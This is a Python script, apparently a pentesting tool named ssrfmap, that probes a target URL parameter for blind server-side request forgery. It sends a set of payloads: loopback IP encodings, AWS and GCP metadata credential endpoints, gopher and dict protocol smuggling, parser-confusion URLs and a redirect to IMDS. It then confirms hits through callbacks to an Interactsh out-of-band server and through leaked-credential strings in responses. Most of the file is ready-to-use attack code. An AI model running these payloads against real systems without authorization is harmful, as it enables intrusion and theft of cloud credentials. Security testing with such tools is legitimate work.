#!/usr/bin/env python3
"""
ssrfmap — Blind SSRF Detection with Interactsh OAST Correlation
Author: zwanski (Zwanski Tech / Tinosoft Informatique)
Usage:  python3 ssrfmap.py --url "https://target.com/api?fetch=x" --param fetch \\
            --headers "Cookie: session=abc"
Deps:   pip install httpx cryptography

OAST correlation model (interactsh):
  1. Generate RSA-2048 keypair. Register public key (base64 PEM) + a secret
     + a 20-char correlation-id with the server.
  2. The registered host = {correlation_id}{13 random chars}.{server}.
     Per payload we PREPEND a unique token label: {token}.{host} so each
     callback is individually attributable.
  3. Poll GET /poll?id=<corr>&secret=<secret>. The server returns:
       { "aes_key": "<base64 RSA-OAEP-encrypted AES-256 key>",   # ONE per batch
         "data":    ["<base64 blob>", ...] }                     # per interaction
     Each blob = 16-byte IV ‖ AES-256-CFB ciphertext. Decrypt the batch key
     with our RSA private key (OAEP-SHA256), then CFB-decrypt each blob → JSON.
  4. Match the token label inside each interaction's full-id to map a callback
     back to the exact bypass payload that triggered it.

  DNS interaction  = host was resolved server-side          → PARTIAL
  HTTP interaction = server actually made the request       → CONFIRMED
"""

import sys
import re
import json
import time
import uuid
import string
import secrets
import base64
import argparse
from urllib.parse import urlparse, urlencode
from typing import Any, Dict, List

import httpx
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# ─── Terminal helpers ────────────────────────────────────────────────────────

_ANSI_RE = re.compile(r'\033\[[0-9;]*m')
COLORS = {
    "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "blue": "\033[94m", "magenta": "\033[95m", "cyan": "\033[96m",
    "white": "\033[97m", "reset": "\033[0m",
}

def c(text: str, color: str = "white", bold: bool = False) -> str:
    b = "\033[1m" if bold else ""
    return f"{b}{COLORS.get(color, '')}{text}{COLORS['reset']}"

def vlen(s: str) -> int:
    return len(_ANSI_RE.sub("", s))

def render_table(headers: List[str], rows: List[List[str]]) -> None:
    w = [len(h) for h in headers]
    for row in rows:
        for i, cell in enumerate(row):
            w[i] = max(w[i], vlen(cell))
    sep = "+" + "+".join("-" * (x + 2) for x in w) + "+"
    fmt = lambda cells: "| " + " | ".join(
        cell + " " * (w[i] - vlen(cell)) for i, cell in enumerate(cells)) + " |"
    print(sep); print(fmt(headers)); print(sep)
    for row in rows:
        print(fmt(row))
    print(sep)

def parse_custom_headers(raw: str) -> Dict[str, str]:
    out: Dict[str, str] = {}
    if not raw:
        return out
    for line in raw.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out

# ─── Interactsh client ────────────────────────────────────────────────────────

class Interactsh:
    def __init__(self, server: str = "oast.fun"):
        self.server = server
        self.http = httpx.Client(verify=False, timeout=10.0,
                                 headers={"User-Agent": "ssrfmap/2.0"})
        self.priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        pub_pem = self.priv.public_key().public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        self.pub_b64 = base64.b64encode(pub_pem).decode()
        # correlation-id: exactly 20 lowercase alnum; host adds 13 random chars
        alpha = string.ascii_lowercase + string.digits
        self.correlation_id = "".join(secrets.choice(alpha) for _ in range(20))
        rand13 = "".join(secrets.choice(alpha) for _ in range(13))
        self.secret = str(uuid.uuid4())
        self.host = f"{self.correlation_id}{rand13}.{self.server}"

    def register(self) -> bool:
        body = {
            "public-key":     self.pub_b64,
            "secret-key":     self.secret,           # Fix: 'secret-key' not 'secret-token'
            "correlation-id": self.correlation_id,
        }
        try:
            r = self.http.post(f"https://{self.server}/register", json=body)
            return r.status_code == 200
        except Exception as e:
            print(c(f"[-] Register failed: {e}", "red"))
            return False

    def poll(self) -> List[Dict[str, Any]]:
        out: List[Dict[str, Any]] = []
        try:
            r = self.http.get(
                f"https://{self.server}/poll",
                params={"id": self.correlation_id, "secret": self.secret},
            )
            if r.status_code != 200:
                return out
            payload = r.json()
        except Exception:
            return out

        blobs = payload.get("data") or []
        key_b64 = payload.get("aes_key")
        if not blobs or not key_b64:
            return out

        # Fix: ONE RSA-encrypted AES key for the whole batch
        try:
            aes_key = self.priv.decrypt(
                base64.b64decode(key_b64),
                padding.OAEP(mgf=padding.MGF1(hashes.SHA256()),
                             algorithm=hashes.SHA256(), label=None),
            )
        except Exception as e:
            print(c(f"[-] AES key RSA-decrypt failed: {e}", "red"))
            return out

        for blob in blobs:
            try:
                raw = base64.b64decode(blob)
                iv, ct = raw[:16], raw[16:]            # Fix: IV prepended to each blob
                dec = Cipher(algorithms.AES(aes_key), modes.CFB(iv)).decryptor()
                plain = dec.update(ct) + dec.finalize()
                out.append(json.loads(plain.decode("utf-8", errors="ignore")))
            except Exception:
                continue
        return out

    def close(self):
        self.http.close()

# ─── Payload matrix ───────────────────────────────────────────────────────────

def build_payloads(host: str) -> List[Dict[str, str]]:
    """
    'oast'    = carries a unique token subdomain → trackable via callback
    'response'= internal IP / metadata → only detectable via response body/timing
    """
    vectors = [
        ("Direct callback",        "oast",     "http://{token}.{host}"),
        ("Decimal IP (127.0.0.1)", "response", "http://2130706433/"),
        ("Octal IP",               "response", "http://0177.0.0.01/"),
        ("Hex IP",                 "response", "http://0x7f.0.0.1/"),
        ("IPv6 loopback",          "response", "http://[::1]/"),
        ("Localhost",              "response", "http://localhost/"),
        ("0.0.0.0",                "response", "http://0.0.0.0/"),
        ("AWS metadata (IMDS)",    "response", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("GCP metadata",           "response", "http://metadata.google.internal/computeMetadata/v1/"),
        ("Gopher smuggling",       "oast",     "gopher://{token}.{host}/_GET%20/%20HTTP/1.1"),
        ("Dict protocol",          "oast",     "dict://{token}.{host}:11211/"),
        ("Parser confusion @",     "oast",     "http://expected.com@{token}.{host}/"),
        ("Parser confusion #",     "oast",     "http://{token}.{host}#@expected.com/"),
        ("Redirect→IMDS",          "oast",     "http://{token}.{host}/redirect?to=http://169.254.169.254/latest/meta-data/"),
    ]
    built = []
    for i, (tech, kind, tmpl) in enumerate(vectors):
        token = f"z{i:02d}ssrf"
        built.append({
            "technique": tech,
            "kind": kind,
            "token": token,
            "payload": tmpl.format(token=token, host=host),
        })
    return built

# ─── Main ─────────────────────────────────────────────────────────────────────

def main() -> None:
    pa = argparse.ArgumentParser(description="ssrfmap — Blind SSRF + OAST correlation")
    pa.add_argument("--url", required=True, help='Target, e.g. "https://t.com/api?fetch=x"')
    pa.add_argument("--param", required=True, help="Parameter to inject into")
    pa.add_argument("--method", default="GET")
    pa.add_argument("--headers", help='Extra headers, newline-separated')
    pa.add_argument("--proxy")
    pa.add_argument("--collaborator", default="oast.fun",
                    help="Interactsh server (default oast.fun)")
    pa.add_argument("--wait", type=int, default=10, help="Seconds to wait for callbacks")
    pa.add_argument("--output", default="ssrfmap_results.json")
    args = pa.parse_args()

    print(f"\n{c('ssrfmap', 'cyan', bold=True)} — Blind SSRF + Interactsh OAST")
    print("[*] Registering OAST session...")
    oast = Interactsh(args.collaborator)
    if not oast.register():
        print(c("[-] Could not register with collaborator. Aborting.", "red"))
        sys.exit(1)
    print(f"[+] OAST host: {c(oast.host, 'cyan')}\n")

    payloads = build_payloads(oast.host)

    parsed = urlparse(args.url)
    base_params = {}
    if parsed.query:
        for pair in parsed.query.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                base_params[k] = v

    base_headers = parse_custom_headers(args.headers)
    client = httpx.Client(
        proxies={"all://": args.proxy} if args.proxy else None,
        timeout=8.0, verify=False, follow_redirects=False,
        headers={"User-Agent": "ssrfmap/2.0", **base_headers},
    )

    history: Dict[str, Dict[str, Any]] = {}
    print(f"[*] Firing {len(payloads)} payloads into '{args.param}'...")
    for v in payloads:
        params = {**base_params, args.param: v["payload"]}
        endpoint = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        rec = {**v, "sent_at": time.time(), "callback": "None",
               "verdict": "NONE", "meta_leak": False, "callback_at": None}
        history[v["token"]] = rec
        try:
            if args.method.upper() == "POST":
                r = client.post(endpoint, params=base_params,
                                data={args.param: v["payload"]})
            else:
                r = client.get(endpoint, params=params)
            body = r.text.lower()
            if any(s in body for s in ("ami-id", "instance-identity",
                                       "accesskeyid", "secretaccesskey",
                                       "computemetadata")):
                rec["meta_leak"] = True
                rec["verdict"] = "CONFIRMED"      # metadata in response = full SSRF
                rec["callback"] = "Response leak"
        except httpx.RequestError:
            pass

    print(f"[*] Waiting {args.wait}s for out-of-band callbacks...")
    time.sleep(args.wait)

    print("[*] Polling collaborator (decrypting interactions)...")
    interactions = oast.poll()

    # ── Correlation ──
    for it in interactions:
        blob = json.dumps(it).lower()
        proto = (it.get("protocol") or "").lower()
        full_id = (it.get("full-id") or it.get("unique-id") or "").lower()
        for token, rec in history.items():
            if token.lower() in blob or token.lower() in full_id:
                if proto == "http":
                    rec["callback"] = "HTTP (full SSRF)"
                    rec["verdict"] = "CONFIRMED"
                    rec["callback_at"] = it.get("timestamp")
                elif proto == "dns" and rec["verdict"] != "CONFIRMED":
                    rec["callback"] = "DNS (resolution only)"
                    rec["verdict"] = "PARTIAL"
                    rec["callback_at"] = it.get("timestamp")
                break

    # ── Render ──
    rows = []
    confirmed = 0
    for rec in history.values():
        v = rec["verdict"]
        vc = "red" if v == "CONFIRMED" else "yellow" if v == "PARTIAL" else "white"
        if v == "CONFIRMED":
            confirmed += 1
        kind_tag = c("OAST", "cyan") if rec["kind"] == "oast" else c("resp-only", "blue")
        rows.append([
            rec["technique"], kind_tag, rec["token"],
            rec["callback"],
            c(v, vc, bold=(v != "NONE")),
        ])

    print("\n" + "=" * 12 + " BLIND SSRF MATRIX " + "=" * 12)
    render_table(["Technique", "Detect", "Token", "Callback", "Verdict"], rows)

    with open(args.output, "w") as f:
        json.dump({"oast_host": oast.host,
                   "history": list(history.values()),
                   "raw_interactions": interactions}, f, indent=2)
    print(f"\n[+] Report → {c(args.output, 'cyan')}")

    if confirmed:
        print(f"\n{c('!!! SSRF CONFIRMED !!!', 'red', bold=True)}")
        for rec in history.values():
            if rec["verdict"] == "CONFIRMED":
                dt = ""
                if rec["callback_at"]:
                    print(f"  {c(rec['technique'], 'yellow', bold=True)} — {rec['callback']}")
                else:
                    print(f"  {c(rec['technique'], 'yellow', bold=True)} — {rec['callback']}")
                if rec["meta_leak"]:
                    print(c(f"    [!] Metadata content leaked in response body!", "red"))
    else:
        print(c("\n[*] No confirmed SSRF. Check PARTIAL (DNS) hits and re-test "
                "response-only payloads manually.", "green"))

    client.close()
    oast.close()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(c("\n[-] Aborted.", "red"))
        sys.exit(1)
